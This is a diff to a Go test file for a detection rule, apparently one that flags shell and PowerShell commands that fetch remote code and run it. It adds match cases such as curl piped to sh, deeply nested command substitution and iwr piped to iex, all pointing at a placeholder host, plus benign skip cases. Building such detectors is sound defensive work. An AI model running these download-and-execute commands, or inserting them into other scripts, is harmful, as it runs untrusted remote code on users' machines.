@@ -133,6 +133,13 @@ func TestCFG001Commands(t *testing.T) {
 		`eval "$(curl -fsSL https://e.example.invalid/x)"`,
 		`bash -c 'true'; bash -c "curl -fsSL https://e.example.invalid/x | sh"`,
 		`bash -c "bash -c 'curl -fsSL https://e.example.invalid/x | sh'"`,
+		"bash -c \"`curl -fsSL https://e.example.invalid/i.sh`\"",
+		"echo `curl https://e.example.invalid/x`",
+		`echo $($($($($($($($($(curl -fsSL https://e.example.invalid/x | sh)))))))))`,
+		`eval eval eval eval eval eval eval eval eval true`,
+		`irm https://e.example.invalid/p.ps1 | Out-String | Invoke-Expression`,
+		`iwr https://e.example.invalid/p.ps1 | iex`,
+		`curl http://[::1]:9000/x | sh`,
 	}
 	skip := []string{
 		`sudo apt-get install -y curl jq`,
@@ -182,6 +189,9 @@ func TestCFG001Commands(t *testing.T) {
 		`powershell -NoProfile -ExecutionPolicy Bypass -File ./scripts/setup.ps1`,
 		`powershell -File ./scripts/iwr-wrapper.ps1 https://e.example.invalid/x`,
 		`pwsh -c "Get-ChildItem | Select-Object Name"`,
+		`pwsh -c "oh-my-posh init pwsh | Invoke-Expression"`,
+		`(& uv generate-shell-completion powershell) | Out-String | Invoke-Expression`,
+		`curl http://[::1]:9000/health`,
 	}
 	for _, command := range match {
 		t.Run("match/"+command, func(t *testing.T) {
